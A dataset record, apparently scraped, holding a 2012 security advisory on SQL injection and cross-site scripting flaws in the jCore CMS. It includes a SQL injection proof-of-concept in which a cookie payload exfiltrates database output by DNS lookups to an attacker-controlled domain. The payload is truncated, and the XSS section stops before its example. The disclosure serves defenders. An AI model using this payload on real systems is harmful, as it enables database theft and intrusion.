{
    "text": "vul_name : jCore 1.0pre Cross Site Scripting & SQL Injection ， vul_cve : CVE-2012-4232 , CVE-2012-4231 ， vul_poc : Advisory ID : HTB23107 ， Product : jCore ， Vendor : jcore.net ， Vulnerable Version ( s )  : 1.0pre and probably prior ， Tested Version : 1.0pre ， Vendor Notification : August 1 , 2012 ， Public Disclosure : October 17 , 2012 ， Vulnerability Type : SQL Injection [ CWE-89 ]  , Cross-Site Scripting [ CWE-79 ]  ， CVE ， CVSSv2 Base Scores : 7.5 ( AV : N/AC : L/Au : N/C : P/I : P/A : P )  , 4.3 ( AV : N/AC : M/Au : N/C : N/I : P/A : N )  ， Solution Status : Fixed by Vendor ， Risk Level : High ， Discovered and Provided : High-Tech Bridge Security Research Lab (  )  ， Advisory Details :  ， High-Tech Bridge Security Research Lab discovered multiple vulnerabilities in jCore , which can be exploited to perform Cross-Site Scripting ( XSS ) and SQL Injection attacks. ， 1 ) SQL Injection in jCore : CVE-2012-4232 ， 1.1 Input passed via the \"memberloginid\" COOKIE parameter to /admin/index.php is not properly sanitised before being used in SQL query. ， This can be exploited to manipulate SQL queries by injecting arbitrary SQL code. ， The PoC code below is based on DNS Exfiltration technique and may be used if the database of the vulnerable application is hosted on a Windows system. The PoC will send a DNS request demanding IP addess for `version (  ) ` ( or any other sensetive output from the database ) subdomain of \".attacker.com\" ( a domain name , DNS server of which is controlled by the attacker )  :  ， GET /admin/?logout=1 HTTP/1.1 ， Cookie : memberloginid=' OR 1= ( select load_file ( CONCAT ( CHAR ( 92 )  , CHAR ( 92 )  ,  ( select version (  )  , CHAR ( 46 )  , CHAR ( 97 )  , CHAR ( 116 )  , CHAR ( 116 )  , CHAR ( 97 )  , CHAR ( 99 )  , CHAR ( 107 )  , CHAR ( 101 )  , CHAR ( 114 )  , CHAR ( 46 )  , CHAR ( 99 )  , CHAR ( 111 )  , CHAR ( 109 )  , CHAR ( 92 )  , CHAR ( 102 )  , CHAR ( 111 )  , CHAR ( 111 )  , CHAR ( 98 )  , CHAR ( 97 )  , CHAR ( 114 ) - ， 2 ) Cross-Site Scripting ( XSS ) in jCore : CVE-2012-4231 ， 2.1 Input passed via the \"path\" GET parameter to /admin/index.php is not properly sanitised before being returned to the user. ， This can be exploited to execute arbitrary HTML and script code in user's browser session in context of affected website. ， The following PoC demonstrates the vulnerability : ",
    "time": "2012.10.18"
}